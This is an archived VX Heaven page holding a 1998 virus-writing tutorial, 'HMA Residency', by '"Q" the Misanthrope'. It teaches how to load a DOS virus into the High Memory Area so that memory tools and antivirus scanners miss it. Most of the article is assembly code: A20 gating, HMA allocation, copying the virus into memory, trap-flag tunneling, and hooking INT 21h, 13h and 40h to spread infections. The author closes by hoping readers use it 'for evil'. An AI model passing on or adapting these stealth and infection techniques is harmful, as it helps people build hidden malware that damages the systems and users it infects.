<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> "Q" the Misanthrope 'HMA Residency' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="&quot;Q&quot; the Misanthrope"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, &quot;Q&quot; the Misanthrope,HMA Residency, error, interrupt, output, call, lower, memory, port, failed, resident, command, segment, push, ffff, interrupts, address"/>
<meta name="Description" content="It allows you to put your virus in a location not seen with any of the conventional memory tools. MEM, CHKDSK and others don't indicate that more memory is being used in the HMA when a virus goes resident there."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"ad723d8b6d0ed79e175547e528b762c1f6b88381-1498756399-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vqm01.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>HMA Residency</h1><p><a href="/lib/?lang=en&amp;author=%22Q%22%20the%20Misanthrope"> "Q" the Misanthrope</a><br/> <em><a href="/vx.php?fid=6#f6">29a [2]</a></em><br/> <em>February 1998</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vqm01.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=DO#vqm01">Back to index</a>] [<a href="/lib/vqm01.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#p1">What is HMA?</a></li>
<li><a href="#p2">Why HMA?</a></li>
<li><a href="#p3">HMA History</a></li>
<li><a href="#p4">Gating a20</a></li>
<li><a href="#p5">Brute force gating a20</a></li>
<li><a href="#p6">HMA and DOS 5+</a></li>
<li><a href="#p7">Hooking interrupts</a></li>
<li><a href="#p8">Using some lower memory as a kernal</a></li>
<li><a href="#p9">What works and what doesn't</a></li>
</ul>
<p>This virus topic has not been discussed: HMA (not UMB) residency.</p>
<h2><a name="p1">What is HMA?</a></h2>
<p>It stands for High Memory Address. HMA memory is a 65520 byte area from FFFF:0010h to FFFF:FFFFh. "Q" the Misanthrope has been using the HMA to store about 15 of his viruses. This is his tutorial on HMA useage.</p>
<h2><a name="p2">Why HMA?</a></h2>
<p>It allows you to put your virus in a location not seen with any of the conventional memory tools. MEM, CHKDSK and others don't indicate that more memory is being used in the HMA when a virus goes resident there. Many anti virus programs did not scan the HMA since no one was crazy enough to put their virus up there. They now have changed because of the many viruses "Q" created that use the HMA.</p>
<h2><a name="p3">HMA History</a></h2>
<p>On an 80286+ there is an address line called a20 that was to be used to map the second megabyte of memory. There are additional address lines (a21, a22, etc) but with this a20 line there became another 64k of memory available to real mode programs. Where did this new memory come from? On an 8086, the addressing of the processor is in SEGMENT:OFFSET format. Each OFFSET spans a 64k SEGMENT. The actual physical address is computed as SEGMENT*10h +OFFSET. The last byte of memory on an 8086 was F000:FFFFh, or F0000h+FFFFh =FFFFFh. Notice that FFFF:000F is the same physical address (FFFF0h+000Fh=FFFFFh). What happens if you were to address FFFF:0010? (FFFF0h+0010h=100000h). On an 8086 this would map back to 0000:0000h but on an 80286 you have just touched the first byte of the second megabyte off memory. The only problem is that the 80286 works just the same as the 8086 and again you are mapped back to 0000:0000h. Some circuitry needed to be added, a20 gating was created. If doing the physical computation caused a carry into the next megabyte then turn the a20 line on. This feature had to be able to switched on and off at will. The 80286 also introduced the 8042 keyboard controller. There was an extra bit on an output port that could control this gating. The creation of the HIMEM.SYS would in part make controlling this a bit easier.</p>
<h2><a name="p4">Gating a20</a></h2>
<p>To enable the a20 gating:</p>
<pre class="source">
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
                 mov     ax,4300h        ;himem.sys check
                 int     2fh
                 cmp     al,80h
                 jne     error           ;no himem.sys loaded
                 mov     ax,4310h
                 int     2fh             ;get far call address es:bx
                 mov     ah,03h          ;Global enable A20
                 push    cs              ;prime the stack for retf
                 call    call_es_bx      ;put ip of next line on stack for retf
 next_line:      or      ax,ax           ;check if error
                 jz      error
                [...]                    ;code to do whatever
 call_es_bx:     push    es              ;now jmp to es:bx with ah as function
                 push    bx              ;the stack is primed to return to
                 retf                    ;next line
                [...]
 error:          mov     ah,09h          ;print command
                 mov     dx,offset errmsg;print error
                 push    cs
                 pop     ds
                 int     21h
                [...]
 errmsg          db      "A20 Global Enable error!",0dh,0ah,"$"
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
</pre>
<p>Note: all of the HIMEM.SYS calls are documented in Ralf Brown's Interrupt list (INT 2Fh AX=4310h).</p>
<h2><a name="p5">Brute force gating a20</a></h2>
<p>Another method is the brute force one. What if you want the HMA available at boot time for your boot sector virus? You can directly control the 8042 keyboard controller. Using command D1. Write Output Port: next byte written to port 60h is placed in the 8042 output port.</p>
<pre>
	|7|6|5|4|3|2|1|0| 8042 Output Port
	| | | | | | | '---- system reset line
	| | | | | | '----- gate A20
	| | | | '-------- undefined
	| | | '--------- output buffer full
	| | '---------- input buffer empty
	| '----------- keyboard clock (output)
	'------------ keyboard data (output)
</pre>
<pre class="source">
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
 .286
                 mov     al,0d1h         ;send command to 8042
                 out     64h,al
 reloop:         in      al,64h          ;check that port 60h is available
                 or      al,02h
                 jnz     reloop
                 mov     al,11100011b    ;keep keyboard working and gate a20
                 out     60h,al
                 push    -1              ;set es=ffffh
                 pop     es
                 push    00h
                 pop     ds              ;set ds=0000h
                 mov     di,10h          ;check if it worked, compare
                 xor     si,si           ;ffff:0010h to 0000:0000 for 16 bytes
                 mov     cx,di           ;set cx to 10h
                 cld
                 rep     cmpsb           ;compare it
                 je      failed
                [...]                    ;worked, copy virus to ffff:xxxx
 failed:         jmp     short failed    ;do whatever
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
</pre>
<h2><a name="p6">HMA and DOS 5+</a></h2>
<p>The easiest method is to use the HMA if DOS 5+ is loaded in the HMA with the commands in the CONFIG.SYS like these:</p>
<pre>
	DEVICE=C:\DOS\HIMEM.SYS
	DOS=HIGH
</pre>
<p>This requirement is on 99% of all machines running this decade. To invoke it, just do this:</p>
<pre class="source">
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
                 mov     ax,4a02h        ;allocate HMA space from DOS
                 mov     di,-1           ;prime di if DOS not high or &lt; ver 5
                 mov     bx,0200h        ;number of bytes you want
                 int     2fh             ;should return es:di to available mem
                 inc     di              ;di=ffffh if no memory or DOS&lt;5 etc.
                 jz      failed          ;if it failed
                 dec     di
                 mov     si,offset virii
                 mov     cx,bx           ;get ready to copy virii
                 cld
                 rep     movs byte ptr es:[di],cs:[si]
                [...]
 failed:         jmp     short failed
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
</pre>
<h2><a name="p7">Hooking interrupts</a></h2>
<p>Now that you are in the HMA, what next? hook in your interrupts and you are off infecting. Problem is that it is not that simple. You can't point an interrupt to ffff:xxxx because the a20 gate may be turned off for some reason. If the a20 gate is turned off then your interrupt will point to code in the first 64k of memory. When DOS 5+ interrupts 13h, 21h, 2fh, etc chain into the HMA they first check if the a20 line is gated, if not, they gate it. The interrupt then continues its code in the HMA. You can tunnel your desired interrupt and hook in to the interrupt chain when the code goes to the HMA. An example of hooking interrupt 21h is:</p>
<pre class="source">
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
 .286
 virus_size      equ     previous_21-begin
 begin:         [...]
                 mov     ax,3501h        ;get int 1 address for tunnel
                 int     21h
                 mov     dx,offset interrupt_1
                 mov     ah,25h          ;set int 1 for tunnel
                 push    es
                 int     21h
                 pop     ds              ;ds:dx will be to set it back
                 push    00h             ;es=0000h
                 pop     es
                 pushf                   ;simulate interrupt stack
                 mov     dx,bx
                 push    cs
                 push    es              ;return to cs:0000 is cd 20
                 int     01h             ;set trap flag
                 db      26h             ;es: override in to int table
                 dw      02effh,21h*04h  ;jmp far ptr es:[0084]
 interrupt_1:    pusha                   ;save varables
                 push    sp
                 pop     bp              ;get pointer
                 push    ds
                 push    es
                 lds     si,dword ptr ss:[bp+10h];get next instruction address
                 cmp     word ptr ds:[si+01h],02effh
                 jne     go_back         ;check if jmp far ?s:[????]
                 cmp     word ptr ds:[si-02h],001cdh
                 org     $-02h           ;see if called from our int 01
                 int     01h
                 je      toggle_tf
                 mov     si,word ptr ds:[si+03h];get address segment of jmp
                 cmp     byte ptr ds:[si+03h],0f0h
                 jb      go_back         ;see if in HMA area
                 mov     bx,((virus_size+10h)SHR 4)*10h
                 mov     di,0ffffh       ;allocate HMA area for virus
                 mov     ax,4a02h
                 int     2fh
                 inc     di              ;is HMA full
                 jz      toggle_tf       ;if so then just don't bother
                 push    si              ;move the virus to the HMA
                 cld
                 mov     cx,virus_size
                 mov     si,0100h        ;copy virus to HMA
                 rep     movs byte ptr es:[di],cs:[si]
                 pop     si              ;now hook the int 21 chain
                 movsw                   ;int 21 copied at previous_21
                 movsw
                 lea     di,word ptr ds:[di-04h-virus_size+offset resident_21]
                 mov     word ptr ds:[si-04h],di;point to resident 21 code
                 mov     word ptr ds:[si-02h],es
 toggle_tf:      xor     byte ptr ss:[bp+15h],01h;toggle the trap flag
 go_back:        pop     es
                 pop     ds
                 popa
                 iret
 resident_21:    pushf                   ;do the voodoo you do so well
                 pusha
                [...]
                 popa
                 popf
                 db      0eah
 previous_21:    label   double
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
</pre>
<p>This is a bit laborous. What else can be done? if you need to hook int 13h then the simple use of int 2fh AH=13h can be done.</p>
<pre class="source">
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
 .286
 ;at the start es:di is pointing to the start of the virus in HMA. es=ffffh
                 mov     ah,13h          ;get int 13 chain
                 int     2fh             ;returns previous ds:dx to bios
                 push    ds              ;int 13h
                 push    dx
                 lea     dx,word ptr ds:[di+offset resident_13]
                 push    -1              ;point to new int 13 in HMA
                 pop     ds
                 int     2fh             ;set new int 13 into chain
                 push    -1
                 pop     ds
                 pop     word ptr ds:[di+previous_13]
                 pop     word ptr ds:[di+previous_13+02h]
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
</pre>
<p>The only problem with this is that Windows will spot it if the 32 bit disk access is enabled.</p>
<p>An even simpler way of hooking into the interrupt 13h chain can be done if all you are wanting to do is infect floppies. Interrupt 40h is the moved interrupt 13h handler that only handles floppy accesses. It can be directly hooked into the HMA because all access to it will be through interrupt 13h that made sure the a20 line was gated before it went into the HMA.</p>
<pre class="source">
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
 .286
 ;at the start es:di is pointing to the start of the virus in HMA. es=ffffh
                 push    es              ;save es
                 mov     ax,3540h        ;get old int 40
                 int     21h
                 pop     ds              ;get es and save old int 40
                 mov     word ptr ds:[di+previous_40],bx
                 mov     word ptr ds:[di+previous_40+02h],es
                 lea     dx,word ptr ds:[di+resident_40]
                 mov     ah,25h          ;set int 40 into hma
                 int     21h
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
</pre>
<p>Interrupt 2fh is very easy to hook into the HMA. Before DOS 7, you could hook your code in at 0070:0005h. DOS 7 moved it to 0070:0168h.</p>
<p>Another way to hook into the interrupt chain and make sure that the a20 line is gated is to have some code in lower memory that calls the interrupt you want to hook in with some bogus function, then jump to the HMA code because the a20 line was gated with the previous interrupt call. An example:</p>
<pre class="source">
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
 .286
 interrupt_21:   push    ax              ;interrupt 21h points to here
                 mov     ah,19h          ;get current drive (bogus instruction)
                 pushf                   ;simulated stack for interrupt
                 db      09ah            ;far call instruction
 previous_21     dd      04530126eh      ;previous interrupt 21 simulation
                 pop     ax
                 db      0eah            ;far jmp
 hma_virus_code  dd      ffffec1ch       ;to virus code in HMA
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
</pre>
<h2><a name="p8">Using some lower memory as a kernal</a></h2>
<p>The trick is where to put these instructions in lower memory. The interrupt vector table can be used either the user area at 0040:00f0h or i like to use the root PSP of COMMAND.COM:</p>
<pre class="source">
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
 .286
                 mov     ah,51h          ;get current PSP
                 int     21h
                 xor     ax,ax           ;prime ax not equal PSP
 find_root_psp:  cmp     ax,bx
                 je      found_root
                 mov     ds,bx           ;point to current psp
                 mov     ax,bx           ;for compare
                 mov     bx,word ptr ds:[16h];get parent psp
                 jmp     short find_root_psp
 found_root:    [...]                    ;ds points to the psp of command.com
                [...]                    ;ds:005ch to ds:007fh is useless space
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
</pre>
<h2><a name="p9">What works and what doesn't</a></h2>
<p>When your virus code is the HMA there are certain things that will not work like you'd like them to: you can not hook your critical error handler in to the HMA. You can not do interrupt 21h writes or reads with DS:DX pointing in the HMA. To do these you will need to use some lower memory and copy the contents into the lower memory and point to it. You can use the lower memory areas discussed above. What does work: BIOS interrupt 13h reads and writes work just fine. Searching the disk buffers and modifying them to insert your code and then marking the buffer as dirty will cause the processor to write it back.</p>
<p>If this has inspired someone else to use the HMA for evil rather than good then my efforts have been worth it.</p>
[<a style="" href="/lib/?lang=EN&amp;index=DO#vqm01">Back to index</a>] [<a href="/lib/vqm01.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vqm01">de</a><a href="/lib/index.php?lang=en&amp;id=vqm01">en</a><a href="/lib/index.php?lang=es&amp;id=vqm01">es</a><a href="/lib/index.php?lang=it&amp;id=vqm01">it</a><a href="/lib/index.php?lang=fr&amp;id=vqm01">fr</a><a href="/lib/index.php?lang=pl&amp;id=vqm01">pl</a><a href="/lib/index.php?lang=ru&amp;id=vqm01">ru</a><a href="/lib/index.php?lang=ua&amp;id=vqm01">ua</a></div>
</body>
</html>
